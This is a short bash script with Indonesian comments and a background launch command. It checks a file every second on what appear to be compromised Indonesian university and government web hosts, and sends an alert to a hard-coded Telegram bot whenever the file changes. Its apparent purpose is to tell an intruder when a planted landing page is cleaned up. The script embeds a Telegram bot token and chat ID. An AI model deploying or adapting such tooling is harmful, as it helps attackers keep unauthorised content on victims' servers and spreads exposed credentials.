wget
chmod
nohup ./1131.sh https://semnas.upstegal.ac.id/cc/pp/index.php /home/semnas/public_html/cc/pp/index.php > baru1131.log 2>&1 &

#!/bin/bash

# Konfigurasi
LANDING_PAGE_URL="$1"  # URL landing page (contoh: http://apk.bimakab.go.id/alfacgiapi/lp/index.php)
FILE_PATH="$2"  # Path file lokal (contoh: /home/lambarasa/web/apk.bimakab.go.id/public_html/alfacgiapi/lp/index.php)
CHECK_INTERVAL=1  # Interval pengecekan dalam detik (1 detik)

# Konfigurasi Telegram
TELEGRAM_BOT_TOKEN="8133030350:AAEpL19WquqWxAiP7BhjCG9Ji84CEzgDOYs"
TELEGRAM_CHAT_ID="5827525866"

# Fungsi untuk mengirim pesan ke Telegram
send_telegram_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
        -d chat_id="$TELEGRAM_CHAT_ID" \
        -d text="$message"
    echo "Pesan Telegram terkirim: $message"
}

# Fungsi untuk membaca isi file
get_file_content() {
    cat "$FILE_PATH" 2>/dev/null
}

# Fungsi untuk mendapatkan timestamp
get_timestamp() {
    date +"%d-%m-%Y %H:%M"  # Format: DD-MM-YYYY HH:MM
}

# Mulai monitoring
echo "Memulai monitoring file: $FILE_PATH (Pengecekan per detik)"
previous_content=""

# Memastikan URL landing page dan file path diubah menjadi URL yang valid
if [ -z "$LANDING_PAGE_URL" ] || [ -z "$FILE_PATH" ]; then
    echo "❌ Parameter tidak lengkap. Gunakan format: ./monit.sh <url_landingpage> <url_path>"
    exit 1
fi

echo "URL landing page yang sesuai: $LANDING_PAGE_URL"

while true; do
    echo "Memeriksa file..."
    current_content=$(get_file_content)

    if [ -z "$current_content" ]; then
        echo "⚠️ Gagal membaca file: $FILE_PATH"
        # Tidak mengirim notifikasi jika gagal membaca file
    else
        if [ -z "$previous_content" ]; then
            previous_content="$current_content"
            echo "Konten awal disimpan."
        elif [ "$current_content" != "$previous_content" ]; then
            echo "🚨 Perubahan terdeteksi pada file: $FILE_PATH"

            # Mendapatkan timestamp saat perubahan terdeteksi
            timestamp=$(get_timestamp)

            # Membuat pesan notifikasi gabungan
            message="🚨 Perubahan terdeteksi: $LANDING_PAGE_URL Waktu: $timestamp"

            # Mengirim notifikasi ke Telegram
            send_telegram_message "$message"

            # Update konten sebelumnya
            previous_content="$current_content"
        else
            echo "Tidak ada perubahan."
            # Tidak mengirim notifikasi jika tidak ada perubahan
        fi
    fi

    sleep "$CHECK_INTERVAL"
done